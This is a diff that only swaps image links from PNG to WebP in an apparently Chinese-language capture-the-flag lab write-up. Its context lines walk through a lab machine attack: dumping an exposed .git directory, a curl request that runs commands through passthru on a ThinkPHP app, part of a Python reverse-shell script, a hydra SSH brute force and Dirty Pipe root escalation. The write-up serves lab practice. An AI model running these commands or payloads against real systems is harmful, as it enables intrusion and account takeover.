@@ -9,7 +9,7 @@
 | Web | ThinkPHP（8080） |
 | 最终路径 | `.git` 泄露 → 代码审计 RCE → www-data → `.pwd` 字典爆破 SSH `welcome` → Dirty Pipe → root |
 
-![环境 / 主机发现](/content/tpn/image-01.png) ![靶机信息](/content/tpn/image-02.png)
+![环境 / 主机发现](/content/tpn/image-01.webp) ![靶机信息](/content/tpn/image-02.webp)
 
 ## 1. 攻击链概览
 
@@ -28,13 +28,13 @@
 
 ## 2. 枚举：8080 与 Git 泄露
 
-![端口 / 服务确认](/content/tpn/image-03.png)
+![端口 / 服务确认](/content/tpn/image-03.webp)
 
 ```bash
 dirsearch -u http://192.168.134.70:8080
 ```
 
-![目录扫描命中 .git](/content/tpn/image-04.png)
+![目录扫描命中 .git](/content/tpn/image-04.webp)
 
 `.git` 可访问，直接 dump：
 
@@ -43,17 +43,17 @@ mkdir -p thinkphp_dump
 git-dumper http://192.168.134.70:8080/.git ./thinkphp_dump
 ```
 
-![git-dumper 还原仓库](/content/tpn/image-05.png)
-![源码落盘](/content/tpn/image-06.png)
+![git-dumper 还原仓库](/content/tpn/image-05.webp)
+![源码落盘](/content/tpn/image-06.webp)
 
 ## 3. 代码审计：Session 与命令执行
 
 拿到完整 ThinkPHP 应用后做本地审计。
 
-![审计入口](/content/tpn/image-07.png)
-![控制器逻辑](/content/tpn/image-08.png)
-![危险调用点](/content/tpn/image-09.png)
-![Session 相关](/content/tpn/image-10.png)
+![审计入口](/content/tpn/image-07.webp)
+![控制器逻辑](/content/tpn/image-08.webp)
+![危险调用点](/content/tpn/image-09.webp)
+![Session 相关](/content/tpn/image-10.webp)
 
 搜 Session 写入：
 
@@ -66,9 +66,9 @@ grep -r 'Session::set'
 
 `Token.php` 会把可控内容写进 Session；后续管理相关接口在已有 Cookie / Session 的前提下，能走到以参数为名的回调（本次验证用的是 `passthru`）。
 
-![审计结论 / 利用准备](/content/tpn/image-11.png)
-![Session / Cookie](/content/tpn/image-12.png)
-![请求构造](/content/tpn/image-13.png)
+![审计结论 / 利用准备](/content/tpn/image-11.webp)
+![Session / Cookie](/content/tpn/image-12.webp)
+![请求构造](/content/tpn/image-13.webp)
 
 带上会话 Cookie 验证 RCE：
 
@@ -81,7 +81,7 @@ curl -b cookies.txt 'http://192.168.134.70:8080/think/Admin/hello?a=id&b=passthr
 
 页面侧会对部分字符做 `htmlspecialchars` 一类过滤，经典反弹一行里的 `<>"'` 容易被吃掉。所以改成先写一个**不含这些字符**的 Python 脚本，再经 `passthru` 落盘执行。
 
-![反弹准备](/content/tpn/image-14.png)
+![反弹准备](/content/tpn/image-14.webp)
 
 ```python
 #!/usr/bin/env python3
@@ -97,11 +97,11 @@ subprocess.call(['/bin/sh','-i'])
 
 写入并执行后拿到 www-data shell。
 
-![写入并执行](/content/tpn/image-15.png)
+![写入并执行](/content/tpn/image-15.webp)
 
 ## 5. 横向：`.pwd` 字典爆破 SSH
 
-![家目录线索](/content/tpn/image-16.png)
+![家目录线索](/content/tpn/image-16.webp)
 
 `/home/welcome/.pwd` 属主是 root，但权限 **644 可读**，里面是一份约 501 条的密码字典，明显在提示 SSH 爆破。
 
@@ -110,16 +110,16 @@ hydra -l welcome -P rockpy_dict.txt ssh://192.168.134.70 -t 6 -f
 # [22][ssh] host: 192.168.134.70 login: welcome password: eecho
 ```
 
-![SSH 登录 welcome](/content/tpn/image-17.png)
+![SSH 登录 welcome](/content/tpn/image-17.webp)
 
 ## 6. 提权弯路：IRC 后门打不通
 
-![welcome 下枚举](/content/tpn/image-18.png)
+![welcome 下枚举](/content/tpn/image-18.webp)
 
 系统里有个可写脚本 `/usr/local/bin/irc_bot.py`。审计看下来是个 IRC 后门，支持远程执行 `more` / `dir` / `busybox` / `whoami` 一类命令。
 
-![irc_bot.py](/content/tpn/image-19.png)
-![服务状态](/content/tpn/image-20.png)
+![irc_bot.py](/content/tpn/image-19.webp)
+![服务状态](/content/tpn/image-20.webp)
 
 实际踩坑：相关服务 **masked（被禁用）**，目标用户 `pycrtlake` 也不存在，后门触发不了。这条线放弃，改打内核。
 
@@ -132,16 +132,16 @@ Linux tpN 5.8.0-050800-generic #202008022230 SMP Sun Aug 2 22:33:21 UTC 2020 x86
 
 `5.8.0` 落在 Dirty Pipe 影响范围内，满足提权条件。
 
-![内核 / 漏洞确认](/content/tpn/image-21.png)
+![内核 / 漏洞确认](/content/tpn/image-21.webp)
 
 上传 PoC，编译后简单利用：
 
-![上传 PoC](/content/tpn/image-22.png)
-![Dirty Pipe 提权成功](/content/tpn/image-23.png)
+![上传 PoC](/content/tpn/image-22.webp)
+![Dirty Pipe 提权成功](/content/tpn/image-23.webp)
 
 利用原理（笔记里贴的说明）：
 
-![Dirty Pipe 原理说明](/content/tpn/image-24.png)
+![Dirty Pipe 原理说明](/content/tpn/image-24.webp)
 
 Dirty Pipe 的核心是：管道页与 page cache 在特定条件下会共享，向管道写入可以污染只读文件在内存中的缓存页，从而在不改磁盘权限模型的前提下改写 SUID 二进制等内容，最终拿到 root。
 
